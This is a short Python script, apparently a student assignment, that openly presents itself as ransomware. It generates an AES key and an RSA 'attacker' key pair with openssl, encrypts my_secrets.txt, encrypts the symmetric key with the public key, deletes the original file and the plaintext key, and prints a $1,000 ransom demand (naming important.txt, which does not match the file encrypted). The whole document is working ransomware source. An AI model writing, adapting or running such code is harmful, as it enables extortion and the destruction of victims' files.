"""
THIS PYTHON PROGRAM IS MADE TO DO RANSOMWARE

---
ransomware
---
Present a simple and successful ransomware

DO NOT ANYHOW USE NOTE THIS IS FOR ASSIGNMENT ONLY

Made BY: Kelvin Yap Ka Seng
"""


#!/usr/bin/env python3

#import modules
import os
import subprocess
import base64

#Step 1 open ssl rand-base64 16 to key.txt
subprocess.run(["openssl", "rand", "-base64", "16"], stdout=open("key.txt", "w"))
print("Symmetric key generated and saved to key.txt")

#Step 2 generate RSA public/private key
subprocess.run(["openssl", "genrsa", "-out", "attacker_private.pem", "2048"])
subprocess.run(["openssl", "rsa", "-in", "attacker_private.pem", "-pubout", "-out", "attacker_public.pem"])
print("RSA key pair generated: attacker_private.pem & attacker_public.pem")

# Read symmetric key from key.txt
with open("key.txt", "r") as f:
    symmetric_key = f.read().strip()

# Step 3: Encrypt my_secrets.txt using symmetric key (change files if needed)
subprocess.run([
    "openssl", "enc", "-aes-128-cbc", "-base64", "-in", "my_secrets.txt",
    "-out", "data_cipher.txt", "-K", base64.b64decode(symmetric_key).hex(),
    "-iv", "00000000000000000000000000000000"
])
print("my_secrets.txt encrypted to data_cipher.txt")

# Step 4: Encrypt key.txt using attacker's public key to key_cipher.txt
subprocess.run([
    "openssl", "rsautl", "-encrypt", "-inkey", "attacker_public.pem", "-pubin",
    "-in", "key.txt", "-out", "key_cipher.bin"
])

# Convert key_cipher.bin to base64
with open("key_cipher.bin", "rb") as f_in, open("key_cipher.txt", "w") as f_out:
    b64_data = base64.b64encode(f_in.read()).decode()
    f_out.write(b64_data)
print("key.txt encrypted to key_cipher.txt (base64 encoded)")

#Delete key.txt
os.remove("key.txt")
print("key.txt deleted")

#Delete my_secrets.txt or whatever the file names are
os.remove("my_secrets.txt")
print("my_secrets.txt deleted")

#Ransom Note
print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")

